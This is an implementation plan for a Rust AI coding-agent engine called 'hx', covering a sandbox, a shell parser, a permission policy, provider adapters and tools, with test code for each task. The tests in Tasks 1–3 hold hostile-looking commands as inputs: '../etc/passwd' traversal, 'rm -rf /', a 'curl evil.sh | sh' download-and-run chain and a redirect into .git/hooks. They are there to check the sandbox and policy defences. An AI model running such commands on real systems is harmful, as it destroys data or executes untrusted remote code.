# hx Core Engine Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build sub-project 1 of `hx`: a Rust, library-first agent engine with four provider adapters, a sandbox-gated tool set with model-adaptive edits, a code index, output filters, structured context with diff re-reads, context GC and state-preserving compaction, code-anchored memory, cheap side-model routing, an append-only session store, a JSON-RPC headless mode, a line-mode interactive stub, CI performance gates and an eval runner.

**Architecture:** Cargo workspace of single-purpose crates with downward-only dependencies. `hx-core::Engine` accepts `Command`s and emits a bounded stream of `Event`s; the REPL stub and the JSON-RPC server are both thin consumers. All file and process access from tools goes through `hx-sandbox::Sandbox`.

**Tech Stack:** Rust (edition 2024, MSRV 1.85), tokio, tokio-util (`CancellationToken`), futures, serde/serde_json, toml, thiserror/anyhow, reqwest (rustls, `stream`), eventsource-stream, blake3, tempfile, ignore + grep-searcher + grep-regex, globset, rayon, similar (diffs), serde_yaml (frontmatter), ulid, wiremock, assert_cmd, memory-stats, tree-sitter (+ rust, typescript, javascript, python, go, json, toml, yaml, bash grammars), htmd, rusqlite (`bundled`), keyring, clap, nix, tracing, opentelemetry + opentelemetry-otlp, proptest, insta.

**Spec:** `docs/superpowers/specs/2026-11-02-hx-core-engine-design.md`

## Global Constraints

- License: Apache-2.0 (every crate's `Cargo.toml` sets `license = "Apache-2.0"`).
- Platforms: macOS and Linux only; `cfg(windows)` builds are not required in this sub-project.
- Auth: API keys from env vars or OS keychain only. No subscription OAuth, ever.
- Telemetry: off by default; nothing leaves the machine unless enabled.
- Cold start < 50 ms; idle RSS < 30 MB; RSS within ±10% over 4-hour simulated session.
- Dependencies point downward only: `hx-cli → {hx-tui, hx-rpc} → hx-core → {hx-provider, hx-tools, hx-context, hx-memory, hx-index, hx-session, hx-sandbox}`; `hx-tools → {hx-sandbox, hx-provider, hx-index, hx-memory}`; `hx-memory → {hx-index, hx-session}`; `hx-index → hx-sandbox`; `hx-context → {hx-provider, hx-tools, hx-index, hx-sandbox}`.
- `hx-tools` must not call `std::fs::*`, `tokio::fs::*`, `std::process::Command`, `tokio::process::Command` directly (enforced by `clippy::disallowed_methods`/`disallowed_types`).
- Errors: `thiserror` per crate; `anyhow` only in `hx-cli`. No `panic = "abort"`.
- Paths: config `~/.config/hx/config.toml`, project `.hx/config.toml`, sessions `~/.local/share/hx/sessions/<project-hash>/<session-id>.jsonl` (+ `blobs/`), ledger `~/.local/share/hx/ledger.db`. Honor `XDG_CONFIG_HOME` / `XDG_DATA_HOME` and an `HX_HOME` override (used by tests).
- Fixed values: bash timeout 120 s; tool output cap 30 KB (head + tail); max 5 retry attempts; compaction threshold 80%; budget warning 80%; system prompt < 2,000 tokens; pinned warning at 10% of window; cancel kills children within 200 ms.
- Token-efficiency values: diff re-read when < 50% of lines changed; context GC threshold max(2,000 tokens, 5% of window), only at step start (before each provider request); output filters apply above 2 KB, ≤ 20 detail lines per item; memory index ≤ 500 tokens; cache scheduler: default cache TTL 300 s, warm-cache benefit multiplier 5, forced mutation at ≥ 90% of window, threshold compaction deferrable from 80% to 90%; loop breaker: failed-attempts list 10 entries / ≤ 300 tokens, previous-result excerpt 5 lines; tolerant edits: anchor interior similarity ≥ 0.9, structural similarity ≥ 0.8, nearest-window ≤ 20 lines; memory entry body ≤ 300 tokens; `recall` top 5, ≤ 2,000 tokens; `web_fetch` question answers ≤ 1,000 tokens; index build of 10,000 files < 10 s, single-file reindex < 50 ms; token regression gate 10%.
- Workspace engine: watcher debounce 50 ms; trigram literal minimum 3 bytes; `find` default limit 20 (max 50); batched read ≤ 10 targets; repo map ≤ 400 tokens; selective trigram grep on 100,000 files < 50 ms; tree glob < 5 ms.
- Execution order note: Tasks 36–37 run right after Task 15; Task 38 runs right after Task 19.
- Exit codes for `hx -p`: 0 completed, 1 error, 2 budget/max_turns/timeout, 130 cancelled.

## Review Focus

1. **Binary or non-UTF-8 files** passed to `read`/`edit`/`grep` — expect a clear tool error ("binary file", "not UTF-8"), never a panic or mangled write. Test in Task 9 and Task 11.
2. **Malformed tool-call arguments from the model** (invalid JSON, missing fields, wrong types) — expect an error tool result returned to the model and the turn continuing. Test in Task 24.
3. **Two `hx` processes on the same project** (concurrent sessions, shared ledger) — expect both to work: separate session files, SQLite in WAL mode with busy timeout. Test in Task 18 and Task 25.
4. **Terminal closed / SIGTERM / SIGHUP mid-turn** — expect child process groups killed and the session left resumable. Test in Task 25.
5. **Symlink tricks and loops** inside the workspace (link pointing outside root, cyclic links during `glob`/`grep`) — expect confinement errors and no hang. Test in Task 1 and Task 9.

---

## File Structure

```
Cargo.toml                      workspace, shared deps, lints
clippy.toml                     (root) disallowed methods for hx-tools via crate-level config
.github/workflows/ci.yml        test, clippy, perf gates
crates/
  hx-sandbox/src/{lib.rs, effect.rs, local.rs, shell.rs, policy.rs, protected.rs}
  hx-provider/src/{lib.rs, canonical.rs, capabilities.rs, catalog.rs, cost.rs, error.rs, retry.rs, mock.rs, sse.rs,
                   anthropic.rs, openai.rs, google.rs, compat.rs}
  hx-provider/catalog/models.toml
  hx-provider/tests/fixtures/{anthropic,openai,google,compat}/*.sse
  hx-index/src/{lib.rs, extract.rs, store.rs, update.rs}, hx-index/queries/<lang>.scm
  hx-memory/src/{lib.rs, entry.rs, store.rs, stale.rs, search.rs, episodes.rs, consolidate.rs}
  hx-tools/src/{lib.rs, spec.rs, read.rs, write.rs, grep.rs, glob.rs, bash.rs, web_fetch.rs, pin_state.rs, index_tools.rs, memory_tools.rs,
                filters/{mod.rs, cargo.rs, pytest.rs, jest.rs, gotest.rs, tsc.rs, eslint.rs},
                edit/{mod.rs, guard.rs, atomic.rs, str_replace.rs, patch.rs, hashline.rs, syntax.rs}}
  hx-tools/clippy.toml
  hx-session/src/{lib.rs, record.rs, writer.rs, reader.rs, blobs.rs, paths.rs}
  hx-context/src/{lib.rs, blocks.rs, tokens.rs, pinned.rs, state.rs, agents_md.rs, assemble.rs, compact.rs, gc.rs, prompt.rs}
  hx-context/prompts/system.md
  hx-core/src/{lib.rs, protocol.rs, config.rs, auth.rs, engine.rs, turn.rs, approvals.rs, budget.rs, ledger.rs,
               resume.rs, routing.rs, memory.rs, telemetry.rs}
  hx-rpc/src/{lib.rs, jsonrpc.rs, server.rs, oneshot.rs}
  hx-tui/src/{lib.rs, repl.rs, render.rs}
  hx-cli/src/{main.rs, cmd/{prompt.rs, sessions.rs, models.rs, undo.rs, eval.rs}}
evals/starter/<task-id>/{task.toml, setup.sh, verify.sh}
evals/replay/<task-id>.json      scripted mock sessions for the token regression gate
evals/baseline.json              committed tokens-per-solved-task baseline
benches/perf/{startup.sh, soak.rs, big_output.rs}
```

---

### Task 1: Workspace scaffold and `hx-sandbox` confinement

**Files:**
- Create: `Cargo.toml`, `crates/hx-sandbox/Cargo.toml`, `crates/hx-sandbox/src/{lib.rs,effect.rs,local.rs}`, `.github/workflows/ci.yml` (cargo test + clippy `-D warnings` on ubuntu-latest and macos-latest)
- Test: `crates/hx-sandbox/tests/confinement.rs`

**Interfaces:**
- Produces:
  - `enum Effect { ReadOnly, Write { paths: Vec<PathBuf> }, Exec { argv: Vec<String> } }`
  - `#[async_trait] trait Sandbox: Send + Sync { fn root(&self) -> &Path; fn resolve(&self, p: &Path) -> Result<PathBuf, SandboxError>; async fn read(&self, p: &Path) -> Result<Vec<u8>, SandboxError>; async fn metadata(&self, p: &Path) -> Result<FileMeta, SandboxError>; async fn write_atomic(&self, p: &Path, bytes: &[u8], mode: Option<u32>) -> Result<(), SandboxError>; async fn spawn(&self, spec: SpawnSpec) -> Result<Child, SandboxError>; fn walker(&self, base: &Path) -> Result<ignore::WalkBuilder, SandboxError>; async fn http_get(&self, url: &Url) -> Result<HttpResponse, SandboxError>; }`
  - `struct FileMeta { mtime: SystemTime, len: u64, mode: u32 }`
  - `struct SpawnSpec { argv: Vec<String>, cwd: PathBuf, env: Vec<(String,String)>, new_process_group: bool }`
  - `struct LocalSandbox::new(root: PathBuf) -> Result<Self, SandboxError>`
  - `enum SandboxError { OutsideRoot(PathBuf), Io(std::io::Error), Network(String), Denied(String) }`

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn resolve_rejects_parent_escape() {
    let (_t, sb) = sandbox();
    assert!(matches!(sb.resolve(Path::new("../etc/passwd")), Err(SandboxError::OutsideRoot(_))));
}
#[tokio::test] async fn resolve_rejects_symlink_pointing_outside() {
    let (t, sb) = sandbox();
    std::os::unix::fs::symlink("/etc", t.path().join("link")).unwrap();
    assert!(matches!(sb.resolve(Path::new("link/passwd")), Err(SandboxError::OutsideRoot(_))));
}
#[tokio::test] async fn resolve_allows_new_file_in_existing_dir() {
    let (t, sb) = sandbox();
    assert_eq!(sb.resolve(Path::new("new.txt")).unwrap(), t.path().canonicalize().unwrap().join("new.txt"));
}
#[tokio::test] async fn write_atomic_then_read_roundtrip_preserves_mode() { /* write with mode 0o755, read back bytes equal, metadata.mode & 0o777 == 0o755 */ }
#[tokio::test] async fn walker_survives_symlink_cycle() {
    let (t, sb) = sandbox();
    std::os::unix::fs::symlink(t.path(), t.path().join("loop")).unwrap();
    let n = sb.walker(Path::new(".")).unwrap().follow_links(true).build().count();
    assert!(n < 100); // terminates
}
```

- [ ] **Step 2: Run** `cargo test -p hx-sandbox` — Expected: FAIL (crate items missing).
- [ ] **Step 3: Implement** `effect.rs`, `local.rs`. `resolve`: join to root, canonicalize the longest existing ancestor, re-append the non-existent tail, reject if not `starts_with(canonical_root)`. `write_atomic`: `tempfile::NamedTempFile::new_in(parent)`, write, `sync_all`, set permissions, `persist`. `spawn`: `tokio::process::Command` with `process_group(0)` when requested, `kill_on_drop(true)`. `http_get`: reqwest, 10 MB body cap.
- [ ] **Step 4: Run** `cargo test -p hx-sandbox` — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(sandbox): workspace scaffold, Sandbox trait, LocalSandbox confinement"`

### Task 2: Shell command parser

**Files:**
- Create: `crates/hx-sandbox/src/shell.rs`
- Test: `crates/hx-sandbox/tests/shell.rs`

**Interfaces:**
- Produces: `fn parse_commands(src: &str) -> Result<Vec<SimpleCommand>, Unparseable>`; `struct SimpleCommand { argv: Vec<String>, redirects: Vec<Redirect> }`; `struct Redirect { target: String, write: bool }`.

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn splits_pipes_and_lists() {
    let c = parse_commands("cargo test && git status | head -n 5; ls").unwrap();
    assert_eq!(argv0s(&c), ["cargo", "git", "head", "ls"]);
}
#[test] fn descends_into_subshell_and_substitution() {
    let c = parse_commands("echo $(rm -rf /tmp/x) && (cd a && make)").unwrap();
    assert_eq!(argv0s(&c), ["echo", "rm", "cd", "make"]);
}
#[test] fn captures_write_redirects() {
    let c = parse_commands("echo hi > .git/hooks/pre-commit").unwrap();
    assert_eq!(c[0].redirects, vec![Redirect { target: ".git/hooks/pre-commit".into(), write: true }]);
}
#[test] fn unbalanced_quote_is_unparseable() { assert!(parse_commands("echo 'oops").is_err()); }
#[test] fn eval_and_bash_dash_c_are_unparseable() {
    assert!(parse_commands("eval \"$X\"").is_err());
    assert!(parse_commands("bash -c 'rm -rf /'").is_err());
}
```

- [ ] **Step 2: Run** `cargo test -p hx-sandbox --test shell` — Expected: FAIL.
- [ ] **Step 3: Implement** with `tree-sitter-bash`: walk the tree collecting `command` nodes (including inside `command_substitution`, `subshell`, `process_substitution`); any `ERROR` node → `Unparseable`; `eval`, `source`, `.`, and `{bash,sh,zsh} -c` → `Unparseable` (cannot be statically analyzed). Unquote words; variable expansions stay literal (`$X`).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(sandbox): tree-sitter-bash command parser"`

### Task 3: Permission policy and protected paths

**Files:**
- Create: `crates/hx-sandbox/src/{policy.rs,protected.rs}`
- Test: `crates/hx-sandbox/tests/policy.rs`

**Interfaces:**
- Consumes: `Effect`, `parse_commands`.
- Produces: `enum Mode { Ask, AutoEdit, Yolo }`; `enum Decision { Allow, Ask { reason: String }, Deny { rule: String } }`; `struct PolicyConfig { mode: Mode, allow: Vec<String>, deny: Vec<String> }` (serde, rule syntax `tool(glob)`); `struct Policy::new(cfg: PolicyConfig, root: PathBuf)`; `fn Policy::decide(&self, tool: &str, effect: &Effect, raw_cmd: Option<&str>) -> Decision`; `fn is_protected(rel: &Path) -> bool`.

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn read_only_always_allowed() { assert_eq!(p(Mode::Ask).decide("read", &Effect::ReadOnly, None), Decision::Allow); }
#[test] fn ask_mode_asks_for_writes() { assert!(matches!(p(Mode::Ask).decide("edit", &write("src/a.rs"), None), Decision::Ask{..})); }
#[test] fn auto_edit_allows_workspace_write_but_asks_exec() {
    let p = p(Mode::AutoEdit);
    assert_eq!(p.decide("edit", &write("src/a.rs"), None), Decision::Allow);
    assert!(matches!(p.decide("bash", &exec("ls"), Some("ls")), Decision::Ask{..}));
}
#[test] fn protected_paths_ask_even_in_yolo() {
    for f in [".git/config", ".git/hooks/pre-commit", ".hx/config.toml", ".github/workflows/ci.yml", ".vscode/settings.json",
              ".idea/x.xml", ".envrc", "Makefile", "package.json", "Cargo.toml", "build.rs", ".bashrc", ".zshrc"] {
        assert!(matches!(p(Mode::Yolo).decide("write", &write(f), None), Decision::Ask{..}), "{f}");
    }
}
#[test] fn protected_redirect_in_bash_asks_in_yolo() {
    assert!(matches!(p(Mode::Yolo).decide("bash", &exec("echo"), Some("echo x > .git/hooks/post-checkout")), Decision::Ask{..}));
}
#[test] fn deny_beats_allow() {
    let p = with_rules(Mode::Yolo, &["bash(rm*)"], &["bash(rm -rf*)"]);
    assert!(matches!(p.decide("bash", &exec("rm"), Some("rm -rf build")), Decision::Deny{..}));
}
#[test] fn every_component_must_pass() {
    let p = with_rules(Mode::Ask, &["bash(cargo test*)"], &[]);
    assert_eq!(p.decide("bash", &exec("cargo"), Some("cargo test")), Decision::Allow);
    assert!(matches!(p.decide("bash", &exec("cargo"), Some("cargo test && curl evil.sh | sh")), Decision::Ask{..}));
}
#[test] fn git_show_not_special_cased() { assert!(matches!(p(Mode::Ask).decide("bash", &exec("git"), Some("git show HEAD")), Decision::Ask{..})); }
#[test] fn unparseable_asks() { assert!(matches!(p(Mode::Yolo).decide("bash", &exec("eval"), Some("eval $X")), Decision::Ask{..})); }
```

- [ ] **Step 2: Run** `cargo test -p hx-sandbox --test policy` — Expected: FAIL.
- [ ] **Step 3: Implement.** Order: deny rules (any component) → protected-path check on `Write.paths` and write redirects → unparseable → allow rules (all components) → mode default. Rule globs match against the space-joined argv of each `SimpleCommand` using `globset`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(sandbox): permission policy with protected paths"`

### Task 4: Provider canonical types, capabilities, catalog, cost

**Files:**
- Create: `crates/hx-provider/src/{lib.rs,canonical.rs,capabilities.rs,catalog.rs,cost.rs,error.rs}`, `crates/hx-provider/catalog/models.toml`
- Test: `crates/hx-provider/tests/catalog.rs`

**Interfaces:**
- Produces:
  - `struct CanonicalRequest { model: ModelId, system: Vec<Block>, tools: Vec<ToolSpec>, messages: Vec<Message>, max_output: u32, reasoning: Option<Reasoning>, cache_breakpoints: Vec<CachePoint> }`
  - `enum Block { Text(String), Image { media_type: String, data: Vec<u8> } }`; `struct Message { role: Role, content: Vec<Content> }`; `enum Content { Text(String), ToolUse { id: String, name: String, input: Value }, ToolResult { id: String, output: String, is_error: bool }, Reasoning { text: String, signature: Option<String> } }`
  - `struct ToolSpec { name: String, description: String, schema: Value }`; `enum Reasoning { Budget(u32), Effort(Effort) }`; `enum CachePoint { AfterSystem, AfterTools, AfterMessage(usize) }`
  - `enum ProviderEvent { TextDelta(String), ReasoningDelta(String), ToolCall { id: String, name: String, input_json: String }, Usage(RawUsage), Quota(Quota), Done { stop: StopReason } }`
  - `struct RawUsage { input: u64, output: u64, cache_read: u64, cache_write: u64 }`; `struct Quota { remaining_requests: Option<u64>, remaining_tokens: Option<u64>, reset_at: Option<SystemTime> }`
  - `struct Capabilities { context_window: u32, max_output: u32, parallel_tools: bool, reasoning: ReasoningStyle, cache: CacheStyle, images: bool, edit_format: EditFormat }`; `enum EditFormat { StrReplace, Patch, Hashline }`
  - `struct Catalog::builtin() -> Catalog`; `fn Catalog::merge(&mut self, overrides: Catalog)`; `fn Catalog::get(&self, id: &ModelId) -> ModelInfo` (unknown → conservative defaults: 32k window, 4k output, no parallel, no cache, no images, Hashline, prices None)
  - `struct ModelInfo { caps: Capabilities, price: Option<Price> }`; `struct Price { input: f64, output: f64, cache_read: f64, cache_write: f64 }` (USD per million tokens)
  - `fn cost_usd(u: &RawUsage, p: Option<&Price>) -> Option<f64>`
  - `enum ProviderError { Transient { status: Option<u16>, retry_after: Option<Duration>, msg: String }, Auth(String), InvalidRequest(String), ContextOverflow(String), Other(String) }`

- [ ] **Step 1: Write the failing tests**

```rust
#[test] fn builtin_catalog_has_each_provider_family() { for id in ["anthropic/claude-sonnet-5-5","openai/gpt-5","google/gemini-3-pro"] { assert!(Catalog::builtin().contains(&id.into()), "{id}"); } }
#[test] fn default_edit_formats_match_spec() {
    let c = Catalog::builtin();
    assert_eq!(c.get(&"anthropic/claude-sonnet-5-5".into()).caps.edit_format, EditFormat::StrReplace);
    assert_eq!(c.get(&"openai/gpt-5".into()).caps.edit_format, EditFormat::Patch);
    assert_eq!(c.get(&"google/gemini-3-pro".into()).caps.edit_format, EditFormat::StrReplace);
    assert_eq!(c.get(&"compat/some-local".into()).caps.edit_format, EditFormat::Hashline);
}
#[test] fn unknown_model_cost_is_none() { assert_eq!(cost_usd(&u(1000,1000,0,0), None), None); }
#[test] fn cost_math() { let p = Price{input:3.0,output:15.0,cache_read:0.3,cache_write:3.75};
    assert!((cost_usd(&u(1_000_000, 100_000, 2_000_000, 0), Some(&p)).unwrap() - (3.0+1.5+0.6)).abs() < 1e-9); }
#[test] fn override_merges_by_id() { /* override price of one model, others untouched */ }
```

- [ ] **Step 2: Run** `cargo test -p hx-provider --test catalog` — Expected: FAIL.
- [ ] **Step 3: Implement.** `models.toml` entries keyed `"<provider>/<model>"`; populate current Anthropic, OpenAI, Google models with published prices at implementation time. If the three model ids used in these tests are not the current flagship ids, replace them in the tests and in Task 35 with the ids you put in the catalog. `include_str!` the catalog.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): canonical types, capabilities, catalog, cost"`

### Task 5: `Provider` trait, retry wrapper, `MockProvider`

**Files:**
- Create: `crates/hx-provider/src/{retry.rs,mock.rs}`; modify `lib.rs`
- Test: `crates/hx-provider/tests/retry.rs`

**Interfaces:**
- Produces:
  - `trait Provider: Send + Sync { fn name(&self) -> &str; fn stream(&self, req: CanonicalRequest, cancel: CancellationToken) -> BoxStream<'static, Result<ProviderEvent, ProviderError>>; }`
  - `struct Retrying<P> { inner: P, max_attempts: u32 /* 5 */, base: Duration /* 500ms */ }` implementing `Provider`; retries only if the error is `Transient` **and no event has been yielded yet for this attempt**; otherwise surfaces the error.
  - `struct MockProvider::new(script: Vec<MockTurn>)`; `enum MockTurn { Events(Vec<ProviderEvent>), Error(ProviderError), DropAfter(Vec<ProviderEvent>) /* yields then Transient */, Stall }`; `fn MockProvider::requests(&self) -> Vec<CanonicalRequest>` (records what it received).

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test(start_paused = true)] async fn retries_transient_then_succeeds() {
    let m = MockProvider::new(vec![MockTurn::Error(transient()), MockTurn::Error(transient()), MockTurn::Events(vec![text("ok"), done()])]);
    let out = collect(Retrying::new(m.clone()).stream(req(), CancellationToken::new())).await;
    assert_eq!(out, vec![text("ok"), done()]); assert_eq!(m.requests().len(), 3);
}
#[tokio::test(start_paused = true)] async fn honors_retry_after() { /* retry_after=7s → elapsed paused clock >= 7s */ }
#[tokio::test(start_paused = true)] async fn gives_up_after_five_attempts() { /* 6 transients → Err(Transient), requests()==5 */ }
#[tokio::test] async fn auth_error_not_retried() { /* requests()==1 */ }
#[tokio::test] async fn mid_stream_drop_surfaces_error_without_retry() { /* DropAfter([text("a")]) → [Ok(text a), Err(Transient)]; engine owns re-issue */ }
#[tokio::test] async fn cancel_stops_stall() { /* Stall + cancel after 10ms → stream ends within 50ms */ }
```

- [ ] **Step 2: Run** `cargo test -p hx-provider --test retry` — Expected: FAIL.
- [ ] **Step 3: Implement.** Backoff `base * 2^attempt` with ±25% jitter, replaced by `retry_after` when present.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): Provider trait, retry wrapper, MockProvider"`

### Task 6: Anthropic adapter

**Files:**
- Create: `crates/hx-provider/src/{sse.rs,anthropic.rs}`, `crates/hx-provider/tests/fixtures/anthropic/{text.sse,tool_use_parallel.sse,thinking.sse,overloaded_529.sse,context_overflow.json}`
- Test: `crates/hx-provider/tests/anthropic.rs`

**Interfaces:**
- Consumes: Task 4 types, `Provider`.
- Produces: `struct AnthropicProvider::new(api_key: String, base_url: Url, catalog: Arc<Catalog>)`; `fn to_wire(req: &CanonicalRequest) -> serde_json::Value` (pub for tests); `fn sse::events(body: impl Stream<Item=Bytes>) -> impl Stream<Item=Result<SseEvent, ProviderError>>`.

- [ ] **Step 1: Write the failing tests** (fixtures served by a local `wiremock` server)

```rust
#[test] fn cache_breakpoints_become_cache_control() {
    let w = to_wire(&req_with(vec![CachePoint::AfterSystem, CachePoint::AfterTools, CachePoint::AfterMessage(3)]));
    assert_eq!(w["system"].as_array().unwrap().last().unwrap()["cache_control"]["type"], "ephemeral");
    assert_eq!(w["tools"].as_array().unwrap().last().unwrap()["cache_control"]["type"], "ephemeral");
    assert!(w["messages"][3]["content"].as_array().unwrap().last().unwrap()["cache_control"].is_object());
}
#[test] fn reasoning_budget_maps_to_thinking() { assert_eq!(to_wire(&req_reasoning(Reasoning::Budget(8000)))["thinking"]["budget_tokens"], 8000); }
#[tokio::test] async fn parses_parallel_tool_use_fixture() { /* two ToolCall events with complete input_json, then Usage, Done{ToolUse} */ }
#[tokio::test] async fn parses_usage_with_cache_tokens() { /* cache_read/cache_write populated */ }
#[tokio::test] async fn rate_limit_headers_become_quota() { /* anthropic-ratelimit-requests-remaining / tokens-remaining / reset → Quota */ }
#[tokio::test] async fn status_529_is_transient_and_413_prompt_too_long_is_context_overflow() {}
```

- [ ] **Step 2: Run** `cargo test -p hx-provider --test anthropic` — Expected: FAIL.
- [ ] **Step 3: Implement.** Messages API, `anthropic-version: 2023-06-01`, `stream: true`. Accumulate `input_json_delta` per content block index; emit `ToolCall` at `content_block_stop`. Record fixtures from the real API once and commit them (scrub keys).
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): Anthropic adapter"`

### Task 7: OpenAI Responses adapter

**Files:**
- Create: `crates/hx-provider/src/openai.rs`, fixtures under `tests/fixtures/openai/`
- Test: `crates/hx-provider/tests/openai.rs`

**Interfaces:**
- Produces: `struct OpenAiProvider::new(api_key: String, base_url: Url, catalog: Arc<Catalog>)`; `fn to_wire(req: &CanonicalRequest, prev: Option<&str>) -> Value`.

- [ ] **Step 1: Write the failing tests:** `reasoning_effort_maps` (`Reasoning::Effort(High)` → `reasoning.effort == "high"`); `function_call_fixture_parses` (`response.function_call_arguments.delta`/`.done` → one `ToolCall`); `usage_maps_cached_tokens` (`input_tokens_details.cached_tokens` → `cache_read`); `x_ratelimit_headers_become_quota`; `previous_response_id_used_only_when_prefix_unchanged` (`to_wire(req, Some("resp_1"))` sends only new items and `previous_response_id`).
- [ ] **Step 2: Run** `cargo test -p hx-provider --test openai` — Expected: FAIL.
- [ ] **Step 3: Implement** against `/v1/responses` with `stream: true`. Track last response id + hash of sent prefix inside the provider; reuse only when the new request's prefix hash matches.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): OpenAI Responses adapter"`

### Task 8: Google and OpenAI-compatible adapters

**Files:**
- Create: `crates/hx-provider/src/{google.rs,compat.rs}`, fixtures under `tests/fixtures/{google,compat}/`
- Test: `crates/hx-provider/tests/{google.rs,compat.rs}`

**Interfaces:**
- Produces: `struct GoogleProvider::new(api_key, base_url, catalog)`; `struct CompatProvider::new(api_key: Option<String>, base_url: Url, catalog)`.

- [ ] **Step 1: Write the failing tests:** Google — `thinking_budget_maps` (`generationConfig.thinkingConfig.thinkingBudget`), `function_call_parts_parse`, `usage_maps_cached_content_token_count`. Compat — `chat_completions_tool_calls_accumulate_by_index`, `missing_usage_is_tolerated` (no `Usage` event, no error), `no_api_key_omits_authorization_header` (Ollama), `ollama_fixture_parses`.
- [ ] **Step 2: Run** `cargo test -p hx-provider --test google --test compat` — Expected: FAIL.
- [ ] **Step 3: Implement.** Google: `:streamGenerateContent?alt=sse`. Compat: `/chat/completions` with `stream: true`, `stream_options.include_usage: true`.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(provider): Google and OpenAI-compatible adapters"`

### Task 9: `Tool` trait and read-side tools (`read`, `write`, `grep`, `glob`)

**Files:**
- Create: `crates/hx-tools/{Cargo.toml,clippy.toml}`, `crates/hx-tools/src/{lib.rs,spec.rs,read.rs,write.rs,grep.rs,glob.rs}`
- Test: `crates/hx-tools/tests/read_side.rs`

**Interfaces:**
- Consumes: `Sandbox`, `Effect`, `Capabilities`, `EditFormat`, `ToolSpec`.
- Produces:
  - `#[async_trait] trait Tool: Send + Sync { fn name(&self) -> &'static str; fn spec(&self, caps: &Capabilities) -> ToolSpec; fn effect(&self, args: &Value) -> Result<Effect, ToolError>; async fn run(&self, args: Value, sb: &dyn Sandbox, cx: &ToolCx) -> ToolResult; }`
  - `struct ToolCx { edit_format: EditFormat, reads: Arc<ReadTracker>, spill_dir: PathBuf, cancel: CancellationToken, output_tx: Option<mpsc::Sender<String>> }`
  - `struct ReadTracker` with `fn record(&self, path: &Path, meta: &FileMeta, hash: blake3::Hash)` and `fn last(&self, path: &Path) -> Option<(SystemTime, blake3::Hash)>`
  - `struct ToolResult { output: String, is_error: bool, effects: Vec<AppliedEffect> }`; `enum AppliedEffect { Read(PathBuf, blake3::Hash), Edited { path: PathBuf, pre_image: Option<Vec<u8>>, post_hash: blake3::Hash } }`
  - `fn registry(caps: &Capabilities) -> Vec<Arc<dyn Tool>>` (fixed order: read, edit, write, bash, grep, glob, web_fetch, pin, state)

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn read_line_range_numbers_lines() { /* lines 2..=3 of "a\nb\nc\nd" → "2\tb\n3\tc" and records tracker */ }
#[tokio::test] async fn read_emits_hashline_anchors_when_format_is_hashline() { /* each line prefixed "<n>:<4-hex>|" */ }
#[tokio::test] async fn read_binary_file_is_error() { let r = run_read("bin.dat" /* contains NUL */).await; assert!(r.is_error && r.output.contains("binary")); }
#[tokio::test] async fn read_non_utf8_is_error() { /* 0xFF 0xFE latin-1 bytes → is_error, "not UTF-8" */ }
#[tokio::test] async fn write_effect_lists_path() { assert_eq!(WriteTool.effect(&json!({"path":"a.txt","content":"x"})).unwrap(), Effect::Write{paths: vec!["a.txt".into()]}); }
#[tokio::test] async fn write_records_pre_image_of_existing_file() {}
#[tokio::test] async fn grep_respects_gitignore() { /* match in ignored target/ not returned */ }
#[tokio::test] async fn glob_returns_sorted_relative_paths_and_terminates_on_symlink_cycle() {}
```

- [ ] **Step 2: Run** `cargo test -p hx-tools --test read_side` — Expected: FAIL.
- [ ] **Step 3: Implement.** `clippy.toml` in `hx-tools` sets `disallowed-methods = ["std::fs::read", "std::fs::write", "std::fs::read_to_string", "std::fs::File::open", "std::fs::File::create", "tokio::fs::read", "tokio::fs::write"]` and `disallowed-types = ["std::process::Command", "tokio::process::Command"]`. Hash anchor = first 4 hex chars of blake3 of the line. Grep output: one line per match `path:line:text`, capped at 30 KB (head kept) — Task 10 later swaps in the shared `cap_output`. In this task `registry` returns only the tools that exist (read, write, grep, glob) in their final relative order; Tasks 10, 13, 15 and 22 insert the rest.
- [ ] **Step 4: Run** `cargo test -p hx-tools --test read_side && cargo clippy -p hx-tools -- -D warnings` — Expected: PASS, no clippy errors.
- [ ] **Step 5: Commit** `git commit -m "feat(tools): Tool trait, read/write/grep/glob, fs lint"`

### Task 10: `bash` tool

**Files:**
- Create: `crates/hx-tools/src/bash.rs` (also exports `pub fn cap_output(full: &str, cap: usize, spill_dir: &Path) -> (String, Option<PathBuf>)`)
- Test: `crates/hx-tools/tests/bash.rs`

**Interfaces:**
- Produces: `BashTool` (`effect` → `Effect::Exec{argv}` from first parsed command; raw command passed to policy separately by the engine via `args["command"]`).

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test] async fn captures_stdout_stderr_and_exit_code() { /* "echo out; echo err >&2; exit 3" → contains out, err, "exit code: 3", is_error */ }
#[tokio::test] async fn output_over_30kb_keeps_head_and_tail_and_spills() {
    let r = run_bash("seq 1 100000").await;
    assert!(r.output.len() <= 31 * 1024); assert!(r.output.starts_with("1\n")); assert!(r.output.contains("100000"));
    assert!(r.output.contains("full output saved to"));
}
#[tokio::test(start_paused = false)] async fn timeout_kills_process_group() { /* "sleep 300 & sleep 300" with timeout 1s → is_error "timed out"; no `sleep 300` processes remain (pgrep) */ }
#[tokio::test] async fn cancel_kills_within_200ms() { /* cancel token at 50ms; run returns < 250ms total; no children */ }
#[tokio::test] async fn streams_output_deltas() { /* output_tx receives lines before completion */ }
```

- [ ] **Step 2: Run** `cargo test -p hx-tools --test bash` — Expected: FAIL.
